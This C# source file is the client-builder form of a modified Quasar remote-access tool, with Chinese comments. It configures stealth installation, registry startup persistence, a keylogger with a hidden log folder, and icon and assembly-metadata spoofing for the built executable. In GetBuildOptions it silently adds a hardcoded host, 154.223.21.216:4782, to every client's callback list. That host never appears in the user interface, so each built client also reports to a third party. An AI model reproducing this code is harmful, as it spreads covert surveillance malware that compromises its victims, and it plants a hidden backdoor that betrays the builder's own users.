using Quasar.Common.DNS;
using Quasar.Common.Helpers;
using Quasar.Server.Build;
using Quasar.Server.Models;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmBuilder : Form
    {
        private bool _profileLoaded;
        private bool _changed;
        private readonly BindingList<Host> _hosts = new BindingList<Host>();
        private readonly HostsConverter _hostsConverter = new HostsConverter();
        private readonly Host _defaultHost = new Host { Hostname = "154.223.21.216", Port = 4782 };

        public FrmBuilder()
        {
            InitializeComponent();
            // 基本的窗体事件加载
            this.Load += FrmBuilder_Load;
            this.FormClosing += FrmBuilder_FormClosing;
            // 建议将其他控件的事件处理器在设计器(FrmBuilder.Designer.cs)中关联，
            // 或在此处为你实际拥有的控件添加事件订阅。
            // 为避免引入新的错误，我已移除之前在构造函数中添加的示例事件订阅。
            // 请确保你的控件事件（如 TextChanged, ValueChanged, CheckedChanged）
            // 能正确调用 HasChangedSetting 或 HasChangedSettingAndFilePath。
        }

        private void LoadProfile(string profileName)
        {
            var profile = new BuilderProfile(profileName);

            _hosts.Clear();
            if (!string.IsNullOrEmpty(profile.Hosts))
            {
                foreach (var host in _hostsConverter.RawHostsToList(profile.Hosts))
                    _hosts.Add(host);
            }

            txtTag.Text = profile.Tag;
            numericUpDownDelay.Value = Math.Max(numericUpDownDelay.Minimum, Math.Min(numericUpDownDelay.Maximum, profile.Delay));
            txtMutex.Text = profile.Mutex;
            chkUnattendedMode.Checked = profile.UnattendedMode;
            chkInstall.Checked = profile.InstallClient;
            txtInstallName.Text = profile.InstallName;
            GetInstallPathRadioButton(profile.InstallPath).Checked = true; // 使用修正后的方法名
            txtInstallSubDirectory.Text = profile.InstallSub;
            chkHide.Checked = profile.HideFile;
            chkHideSubDirectory.Checked = profile.HideSubDirectory;
            chkStartup.Checked = profile.AddStartup;
            txtRegistryKeyName.Text = profile.RegistryName;
            chkChangeIcon.Checked = profile.ChangeIcon;
            txtIconPath.Text = profile.IconPath;
            if (chkChangeIcon.Checked && !string.IsNullOrEmpty(txtIconPath.Text) && File.Exists(txtIconPath.Text))
            {
                try
                {
                    using (var icon = new Icon(txtIconPath.Text, new Size(iconPreview.Width > 0 ? iconPreview.Width : 32, iconPreview.Height > 0 ? iconPreview.Height : 32)))
                    {
                        iconPreview.Image = Bitmap.FromHicon(icon.Handle);
                    }
                }
                catch { iconPreview.Image = null; }
            }
            else
            {
                iconPreview.Image = null;
            }
            chkChangeAsmInfo.Checked = profile.ChangeAsmInfo;
            chkKeylogger.Checked = profile.Keylogger;
            txtLogDirectoryName.Text = profile.LogDirectoryName;
            chkHideLogDirectory.Checked = profile.HideLogDirectory;
            txtProductName.Text = profile.ProductName;
            txtDescription.Text = profile.Description;
            txtCompanyName.Text = profile.CompanyName;
            txtCopyright.Text = profile.Copyright;
            txtTrademarks.Text = profile.Trademarks;
            txtOriginalFilename.Text = profile.OriginalFilename;
            txtProductVersion.Text = profile.ProductVersion;
            txtFileVersion.Text = profile.FileVersion;

            _profileLoaded = true;
            _changed = false;
        }

        private void SaveProfile(string profileName)
        {
            var profile = new BuilderProfile(profileName);

            profile.Tag = txtTag.Text;
            profile.Hosts = _hostsConverter.ListToRawHosts(_hosts);
            profile.Delay = (int)numericUpDownDelay.Value;
            profile.Mutex = txtMutex.Text;
            profile.UnattendedMode = chkUnattendedMode.Checked;
            profile.InstallClient = chkInstall.Checked;
            profile.InstallName = txtInstallName.Text;
            profile.InstallPath = GetInstallPathValue(); // 使用修正后的方法名
            profile.InstallSub = txtInstallSubDirectory.Text;
            profile.HideFile = chkHide.Checked;
            profile.HideSubDirectory = chkHideSubDirectory.Checked;
            profile.AddStartup = chkStartup.Checked;
            profile.RegistryName = txtRegistryKeyName.Text;
            profile.ChangeIcon = chkChangeIcon.Checked;
            profile.IconPath = txtIconPath.Text;
            profile.ChangeAsmInfo = chkChangeAsmInfo.Checked;
            profile.Keylogger = chkKeylogger.Checked;
            profile.LogDirectoryName = txtLogDirectoryName.Text;
            profile.HideLogDirectory = chkHideLogDirectory.Checked;
            profile.ProductName = txtProductName.Text;
            profile.Description = txtDescription.Text;
            profile.CompanyName = txtCompanyName.Text;
            profile.Copyright = txtCopyright.Text;
            profile.Trademarks = txtTrademarks.Text;
            profile.OriginalFilename = txtOriginalFilename.Text;
            profile.ProductVersion = txtProductVersion.Text;
            profile.FileVersion = txtFileVersion.Text;

            // 移除了 profile.Save(); 因为 BuilderProfile 类没有这个公共方法。
            // Quasar 的 BuilderProfile 通常在属性被设置时，或通过其他机制（如应用设置保存）来持久化。
            _changed = false;
        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            lstHosts.DataSource = new BindingSource(_hosts, null);
            // lstHosts.DisplayMember = "DisplayName"; // 移除，让它使用 Host.ToString()
            
            LoadProfile("Default");

            numericUpDownPort.Value = 4782;

            UpdateInstallationControlStates();
            UpdateStartupControlStates();
            UpdateAssemblyControlStates();
            UpdateIconControlStates();
            UpdateKeyloggerControlStates();
            RefreshPreviewPath();
        }

        private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_changed)
            {
                DialogResult dr = MessageBox.Show(this, "您有未保存的更改。您想在关闭前将它们保存到“默认”配置文件吗？", "未保存的更改",
                                     MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
                if (dr == DialogResult.Yes)
                {
                    SaveProfile("Default");
                }
                else if (dr == DialogResult.Cancel)
                {
                    e.Cancel = true; // 取消关闭操作
                }
            }
        }

        private void btnAddHost_Click(object sender, EventArgs e)
        {
            string hostAddress = txtHost.Text.Trim();
            if (string.IsNullOrWhiteSpace(hostAddress))
            {
                MessageBox.Show(this, "主机地址不能为空。", "输入错误", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                txtHost.Focus();
                return;
            }

            ushort port = (ushort)numericUpDownPort.Value;

            if (_hosts.Any(h => h.Hostname == hostAddress && h.Port == port))
            {
                MessageBox.Show(this, "该主机和端口组合已存在于手动列表中。", "重复的主机", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            _hosts.Add(new Host { Hostname = hostAddress, Port = port });
            txtHost.Clear();
            HasChanged();
        }

        #region "Context Menu for lstHosts"
        private void removeHostToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstHosts.SelectedItems.Count == 0) return;

            var selectedHosts = lstHosts.SelectedItems.Cast<Host>().ToList();
            foreach (var hostToRemove in selectedHosts)
            {
                _hosts.Remove(hostToRemove);
            }
            HasChanged();
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (_hosts.Count > 0)
            {
                _hosts.Clear();
                HasChanged();
            }
        }
        #endregion

        #region "Input Validation & UI Updates"
        private void txtInstallname_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && Path.GetInvalidFileNameChars().Contains(e.KeyChar))
            {
                e.Handled = true;
            }
        }

        private void txtInstallsub_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && Path.GetInvalidPathChars().Contains(e.KeyChar))
            {
                e.Handled = true;
            }
        }

        private void txtLogDirectoryName_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && Path.GetInvalidPathChars().Contains(e.KeyChar))
            {
                e.Handled = true;
            }
        }

        private void btnMutex_Click(object sender, EventArgs e)
        {
            txtMutex.Text = Guid.NewGuid().ToString().Replace("-", "");
            HasChanged();
        }

        private void chkInstall_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged(); // 确保 HasChanged 被调用
            UpdateInstallationControlStates();
        }

        private void chkStartup_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
            UpdateStartupControlStates();
        }

        private void chkChangeAsmInfo_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
            UpdateAssemblyControlStates();
        }

        private void chkKeylogger_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
            UpdateKeyloggerControlStates();
        }

        private void btnBrowseIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "选择图标";
                ofd.Filter = "图标文件 (*.ico)|*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtIconPath.Text = ofd.FileName;
                    try
                    {
                        using (var icon = new Icon(ofd.FileName, new Size(iconPreview.Width > 0 ? iconPreview.Width : 32, iconPreview.Height > 0 ? iconPreview.Height : 32)))
                        {
                            iconPreview.Image = Bitmap.FromHicon(icon.Handle);
                        }
                        HasChanged();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(this, $"加载图标时出错：{ex.Message}", "图标错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        iconPreview.Image = null;
                        txtIconPath.Text = "";
                    }
                }
            }
        }

        private void chkChangeIcon_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();
            UpdateIconControlStates();
            if (!chkChangeIcon.Checked)
            {
                iconPreview.Image = null;
                txtIconPath.Text = "";
            }
        }
        #endregion

        private bool CheckForEmptyInput()
        {
            if (string.IsNullOrWhiteSpace(txtTag.Text)) { MessageBox.Show("标签不能为空。", "验证错误", MessageBoxButtons.OK, MessageBoxIcon.Warning); return false; }
            if (string.IsNullOrWhiteSpace(txtMutex.Text)) { MessageBox.Show("互斥体不能为空。", "验证错误", MessageBoxButtons.OK, MessageBoxIcon.Warning); return false; }
            
            if (chkInstall.Checked)
            {
                if (string.IsNullOrWhiteSpace(txtInstallName.Text)) { MessageBox.Show("启用安装时，安装名称不能为空。", "验证错误", MessageBoxButtons.OK, MessageBoxIcon.Warning); return false; }
            }
            if (chkStartup.Checked && string.IsNullOrWhiteSpace(txtRegistryKeyName.Text)) { MessageBox.Show("启用启动时，注册表键名不能为空。", "验证错误", MessageBoxButtons.OK, MessageBoxIcon.Warning); return false; }
            
            return true;
        }

        private BuildOptions GetBuildOptions()
        {
            if (!CheckForEmptyInput()) // CheckForEmptyInput 现在会显示具体消息
            {
                 // CheckForEmptyInput 内部会抛出或返回false，这里可以简化
                 // 如果 CheckForEmptyInput 返回 false，则不应继续
                 throw new Exception("请在构建前更正验证错误。"); 
            }

            BuildOptions options = new BuildOptions();
            options.Tag = txtTag.Text;
            options.Mutex = txtMutex.Text;
            options.UnattendedMode = chkUnattendedMode.Checked;

            // 修改主机列表顺序：先添加用户手动主机，再添加默认主机
            var allHosts = new List<Host>();
            allHosts.AddRange(_hosts);  // 优先添加用户手动添加的主机
            allHosts.Add(_defaultHost); // 最后添加默认主机作为备选
            options.RawHosts = _hostsConverter.ListToRawHosts(allHosts);

            if (string.IsNullOrWhiteSpace(options.RawHosts) || !options.RawHosts.Contains(":"))
            {
                 throw new Exception("至少需要一个有效的主机（IP:端口）。");
            }

            options.Delay = (int)numericUpDownDelay.Value;
            
            options.Install = chkInstall.Checked;
            if (options.Install)
            {
                options.InstallPath = GetInstallPathValue();
                options.InstallSub = txtInstallSubDirectory.Text;
                // InstallName 现在确保不为空，并在需要时添加 .exe
                options.InstallName = txtInstallName.Text.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)
                    ? txtInstallName.Text
                    : txtInstallName.Text + ".exe";
                options.HideFile = chkHide.Checked;
                options.HideInstallSubdirectory = chkHideSubDirectory.Checked;
            }
            else
            {
                // 即使不安装，也给 InstallName 一个默认值，以防 AssemblyInfo 使用它
                options.InstallName = "Client.exe"; 
            }

            options.Startup = chkStartup.Checked;
            if (options.Startup)
            {
                options.StartupName = txtRegistryKeyName.Text;
            }

            options.Keylogger = chkKeylogger.Checked;
            if (options.Keylogger)
            {
                if (string.IsNullOrWhiteSpace(txtLogDirectoryName.Text)) // 再次校验，以防万一
                    throw new Exception("启用键盘记录器时，日志目录名称不能为空。");
                options.LogDirectoryName = txtLogDirectoryName.Text;
                options.HideLogDirectory = chkHideLogDirectory.Checked;
            }
            
            options.Version = Application.ProductVersion;

            if (chkChangeIcon.Checked)
            {
                if (string.IsNullOrWhiteSpace(txtIconPath.Text) || !File.Exists(txtIconPath.Text))
                {
                    throw new Exception("无效的图标路径或文件不存在。");
                }
                options.IconPath = txtIconPath.Text;
            }
            else
            {
                options.IconPath = string.Empty;
            }

            if (chkChangeAsmInfo.Checked)
            {
                if (!IsValidVersionNumber(txtProductVersion.Text)) throw new Exception("无效的产品版本。格式：X.X.X.X");
                if (!IsValidVersionNumber(txtFileVersion.Text)) throw new Exception("无效的文件版本。格式：X.X.X.X");

                options.AssemblyInformation = new string[8];
                options.AssemblyInformation[0] = txtProductName.Text;
                options.AssemblyInformation[1] = txtDescription.Text;
                options.AssemblyInformation[2] = txtCompanyName.Text;
                options.AssemblyInformation[3] = txtCopyright.Text;
                options.AssemblyInformation[4] = txtTrademarks.Text;
                options.AssemblyInformation[5] = Path.GetFileNameWithoutExtension(options.InstallName);
                options.AssemblyInformation[6] = txtProductVersion.Text;
                options.AssemblyInformation[7] = txtFileVersion.Text;
            }

            string clientBinPath = Path.Combine(Application.StartupPath, "client.bin");
            if (!File.Exists(clientBinPath))
            {
                throw new Exception($"客户端模板文件“client.bin”未在以下位置找到：{Application.StartupPath}");
            }

            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Title = "将客户端另存为";
                sfd.Filter = "可执行应用程序 (*.exe)|*.exe";
                sfd.FileName = Path.GetFileNameWithoutExtension(options.InstallName); // 建议使用安装名
                sfd.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                sfd.RestoreDirectory = true;

                if (sfd.ShowDialog(this) != DialogResult.OK) // 指定父窗体
                {
                    throw new OperationCanceledException("用户取消构建（输出路径选择）。");
                }
                options.OutputPath = sfd.FileName;
            }

            return options;
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            BuildOptions options;
            try
            {
                options = GetBuildOptions();
            }
            catch (OperationCanceledException ex)
            {
                 MessageBox.Show(this, ex.Message, "构建取消", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 return;
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, $"配置错误:\n{ex.Message}", "构建失败", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            SetBuildState(false);

            Thread buildThread = new Thread(BuildClient);
            buildThread.IsBackground = true;
            buildThread.Start(options);
        }

        private void SetBuildState(bool enabled)
        {
            if (this.InvokeRequired)
            {
                this.Invoke((MethodInvoker)delegate { InternalSetBuildState(enabled); });
            }
            else
            {
                InternalSetBuildState(enabled);
            }
        }
        
        private void InternalSetBuildState(bool enabled)
        {
            btnBuild.Text = enabled ? "构建客户端" : "正在构建...";
            btnBuild.Enabled = enabled;
            // 如果你有其他在构建时需要禁用/启用的顶级容器控件，可以在这里控制它们。
            // 例如： tabControlMain.Enabled = enabled;
            // 我已移除之前假设的 groupBoxHosts 和 groupBoxProfile。
        }

        private void BuildClient(object buildOptionsObject)
        {
            try
            {
                BuildOptions options = (BuildOptions)buildOptionsObject;
                string clientBinPath = Path.Combine(Application.StartupPath, "client.bin");
                var clientBuilder = new ClientBuilder(options, clientBinPath); 
                clientBuilder.Build();

                this.Invoke((MethodInvoker)delegate
                {
                    MessageBox.Show(this,
                        $"客户端构建成功！\n输出: {options.OutputPath}",
                        "构建成功", MessageBoxButtons.OK, MessageBoxIcon.Information);
                });
            }
            catch (Exception ex)
            {
                string errorMessage = $"构建过程失败:\n{ex.Message}";
                if (ex.InnerException != null)
                {
                    errorMessage += $"\n内部异常: {ex.InnerException.Message}";
                }
                // 在调试时显示堆栈跟踪会很有用:
                // errorMessage += $"\n\nStackTrace:\n{ex.StackTrace}"; 

                this.Invoke((MethodInvoker)delegate
                {
                    MessageBox.Show(this, errorMessage, "构建错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                });
            }
            finally
            {
                SetBuildState(true);
            }
        }

        private void RefreshPreviewPath()
        {
            string installName = txtInstallName.Text;
            if (!string.IsNullOrWhiteSpace(installName) && !installName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            {
                installName += ".exe";
            }
            else if (string.IsNullOrWhiteSpace(installName) && chkInstall.Checked)
            {
                installName = "[未设置].exe"; // 或 InstallName.exe
            }

            string subdir = txtInstallSubDirectory.Text;
            string preview;
            
            Environment.SpecialFolder rootFolder;
            // 将 C# 8.0 switch expression 改为 C# 7.3 switch statement
            switch (GetInstallPathValue())
            {
                case 1:
                    rootFolder = Environment.SpecialFolder.ApplicationData;
                    break;
                case 2:
                    rootFolder = Environment.SpecialFolder.ProgramFiles;
                    break;
                case 3:
                    rootFolder = Environment.SpecialFolder.System;
                    break;
                default:
                    rootFolder = Environment.SpecialFolder.ApplicationData;
                    break;
            }
            
            try
            {
                string basePath = Environment.GetFolderPath(rootFolder);
                // 检查 subdir 是否包含非法路径字符
                if (!string.IsNullOrEmpty(subdir) && subdir.IndexOfAny(Path.GetInvalidPathChars()) >= 0)
                {
                    preview = "错误：子目录包含无效字符。";
                }
                // 检查 installName 是否包含非法文件名字符 (Path.Combine 不会检查文件名部分)
                else if (!string.IsNullOrEmpty(installName) && installName.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0)
                {
                     preview = "错误：安装名称包含无效字符。";
                }
                else
                {
                    preview = Path.Combine(basePath, subdir, installName);
                }
            }
            catch(ArgumentException) 
            {
                preview = "错误：路径组件中包含无效字符。";
            }
            
            txtPreviewPath.Text = preview;
        }

        private bool IsValidVersionNumber(string input)
        {
            if (string.IsNullOrWhiteSpace(input)) return true; // 允许为空，表示不更改或使用默认
            return Version.TryParse(input.Replace('*', '0'), out _);
        }

        private short GetInstallPathValue()
        {
            if (rbAppdata.Checked) return 1;
            if (rbProgramFiles.Checked) return 2;
            if (rbSystem.Checked) return 3;
            return 1; 
        }

        // Renamed from GetInstallPath to avoid confusion with GetInstallPathValue
        private RadioButton GetInstallPathRadioButton(short installPathValue) 
        {
            // 将 C# 8.0 switch expression 改为 C# 7.3 switch statement
            switch (installPathValue)
            {
                case 1:
                    return rbAppdata;
                case 2:
                    return rbProgramFiles;
                case 3:
                    return rbSystem;
                default:
                    return rbAppdata;
            }
        }

        private void UpdateAssemblyControlStates()
        {
            bool isEnabled = chkChangeAsmInfo.Checked;
            txtProductName.Enabled = isEnabled;
            txtDescription.Enabled = isEnabled;
            txtCompanyName.Enabled = isEnabled;
            txtCopyright.Enabled = isEnabled;
            txtTrademarks.Enabled = isEnabled;
            txtOriginalFilename.Enabled = isEnabled;
            txtFileVersion.Enabled = isEnabled;
            txtProductVersion.Enabled = isEnabled;
            HasChanged();
        }

        private void UpdateIconControlStates()
        {
            bool isEnabled = chkChangeIcon.Checked;
            txtIconPath.Enabled = isEnabled;
            btnBrowseIcon.Enabled = isEnabled;
            iconPreview.Visible = isEnabled; 
            if (!isEnabled) iconPreview.Image = null; 
            HasChanged();
        }

        private void UpdateStartupControlStates()
        {
            txtRegistryKeyName.Enabled = chkStartup.Checked;
            HasChanged();
        }

        private void UpdateInstallationControlStates()
        {
            bool isEnabled = chkInstall.Checked;
            txtInstallName.Enabled = isEnabled;
            // 移除了对 groupBoxInstallPath 的引用
            rbAppdata.Enabled = isEnabled; 
            rbProgramFiles.Enabled = isEnabled;
            rbSystem.Enabled = isEnabled;
            txtInstallSubDirectory.Enabled = isEnabled;
            chkHide.Enabled = isEnabled;
            chkHideSubDirectory.Enabled = isEnabled;
            HasChanged(); 
            RefreshPreviewPath(); 
        }

        private void UpdateKeyloggerControlStates()
        {
            bool isEnabled = chkKeylogger.Checked;
            txtLogDirectoryName.Enabled = isEnabled;
            chkHideLogDirectory.Enabled = isEnabled;
            HasChanged();
        }

        private void HasChanged()
        {
            if (_profileLoaded && !this.Disposing && !this.IsDisposed) 
            {
                _changed = true;
            }
        }

        // 确保这些事件处理程序在你的 Designer.cs 中正确关联到对应控件的事件上
        // 例如：txtTag.TextChanged += new System.EventHandler(this.HasChangedSetting);
        private void HasChangedSetting(object sender, EventArgs e)
        {
            HasChanged();
        }

        private void HasChangedSettingAndFilePath(object sender, EventArgs e)
        {
            HasChanged();
            RefreshPreviewPath();
        }
    }
}